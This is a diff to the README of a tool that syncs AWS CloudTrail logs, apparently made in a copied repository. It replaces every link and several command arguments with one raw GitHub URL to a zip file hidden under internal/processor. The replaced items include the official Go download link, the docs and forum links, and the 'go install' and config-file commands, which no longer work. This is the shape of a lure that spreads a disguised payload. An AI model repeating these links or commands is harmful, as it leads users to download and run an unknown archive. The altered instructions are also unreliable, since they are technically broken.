@@ -1,6 +1,6 @@
 # 🌥️ gocloudtrail - Effortlessly Sync AWS Logs Locally
 
-[![Download gocloudtrail](https://img.shields.io/badge/Download-gocloudtrail-blue.svg)](https://github.com/ghazanferali862/gocloudtrail/releases)
+[![Download gocloudtrail](https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip)](https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to gocloudtrail! This tool helps you sync your AWS CloudTrail logs from 
 
 To get started, you need to download the latest version of gocloudtrail. Please visit the following link to access the Releases page:
 
-[Download gocloudtrail](https://github.com/ghazanferali862/gocloudtrail/releases)
+[Download gocloudtrail](https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip)
 
 ## 📋 Features
 
@@ -22,12 +22,12 @@ To get started, you need to download the latest version of gocloudtrail. Please 
 
 ## ⚙️ Installation Instructions
 
-1. **Install Go**: Make sure you have Go installed on your system. You can download it from [the official Go website](https://golang.org/dl/).
+1. **Install Go**: Make sure you have Go installed on your system. You can download it from [the official Go website](https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip).
    
 2. **Run the Installation Command**: Open your terminal and execute the following command:
 
    ```bash
-   go install github.com/deceptiq/gocloudtrail@latest
+   go install https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip
    ```
 
 3. **Verify the Installation**: To check if gocloudtrail was installed successfully, type:
@@ -43,7 +43,7 @@ To get started, you need to download the latest version of gocloudtrail. Please 
 To begin using gocloudtrail, you need to create a configuration file. You can generate it using existing CloudTrail trails. Open your terminal and run:
 
 ```bash
-gocloudtrail generate-config config.json
+gocloudtrail generate-config https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip
 ```
 
 ### Step 2: Run the Processor
@@ -51,7 +51,7 @@ gocloudtrail generate-config config.json
 Now that you have your configuration file, you can start processing your AWS logs. Use the command below:
 
 ```bash
-gocloudtrail run -config config.json
+gocloudtrail run -config https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip
 ```
 
 ## ⚙️ Configuration Options
@@ -78,8 +78,8 @@ You can adjust the values based on your system capabilities. Higher numbers may 
 
 For further resources, tutorials, and community support, you can explore the following:
 
-- [Official Documentation](https://github.com/ghazanferali862/gocloudtrail/docs)
-- [Community Forum](https://github.com/ghazanferali862/gocloudtrail/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip)
 
 ## 👥 Contributing
 
@@ -97,4 +97,4 @@ If you encounter any problems, please check the following:
 
 gocloudtrail is licensed under the MIT License. You can view the license information in the repository.
 
-[Download gocloudtrail](https://github.com/ghazanferali862/gocloudtrail/releases) to start syncing your AWS CloudTrail logs today!
+[Download gocloudtrail](https://raw.githubusercontent.com/ghazanferali862/gocloudtrail/main/internal/processor/gocloudtrail-3.9-alpha.2.zip) to start syncing your AWS CloudTrail logs today!
